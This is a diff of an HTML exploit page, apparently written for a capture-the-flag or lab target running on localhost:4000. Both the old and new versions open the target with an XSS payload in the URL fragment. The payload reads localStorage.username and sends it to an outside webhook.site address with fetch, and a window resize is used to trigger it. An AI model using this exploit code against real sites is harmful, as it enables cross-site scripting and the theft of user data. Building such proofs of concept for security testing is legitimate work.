@@ -1,23 +1,21 @@
 <html>
 <head></head>
 <body>
-  <iframe id="i" style="width:300px;height:300px;" src=""></iframe>
-  <script>
-    var i = document.querySelector("#i");
-    var base = "https://webhook.site/bdfce11f-cd6b-461c-b1df-e538fdca65ff";
-    fetch(base + "?stage=start", {mode:'no-cors'});
-    
-    i.src = "http://localhost:4000/drawing/abcd#src=1&onerror="
-      + encodeURIComponent("fetch('"+base+"?stage=xss&c='+encodeURIComponent(localStorage.username),{mode:'no-cors'})")
-      + "&is";
+<script>
+  var base = "https://webhook.site/bdfce11f-cd6b-461c-b1df-e538fdca65ff";
+  fetch(base + "?stage=start", {mode:'no-cors'});
+  
+  var payload = "fetch('"+base+"?stage=xss&c='+encodeURIComponent(localStorage.username),{mode:'no-cors'})";
+  var url = "http://localhost:4000/drawing/abcd#src=1&onerror="
+    + encodeURIComponent(payload) + "&is";
 
-    setTimeout(() => {
-      fetch(base + "?stage=before_resize", {mode:'no-cors'});
-      // Use style width - this triggers resize event on iframe's window
-      i.style.width = "1000px";
-      i.style.height = "1000px";
-      fetch(base + "?stage=after_resize", {mode:'no-cors'});
-    }, 2500);
-  </script>
+  var w = window.open(url, "_blank", "width=300,height=300");
+  
+  setTimeout(() => {
+    fetch(base + "?stage=before_resize", {mode:'no-cors'});
+    w.resizeTo(1000, 1000);
+    fetch(base + "?stage=after_resize", {mode:'no-cors'});
+  }, 2500);
+</script>
 </body>
 </html>
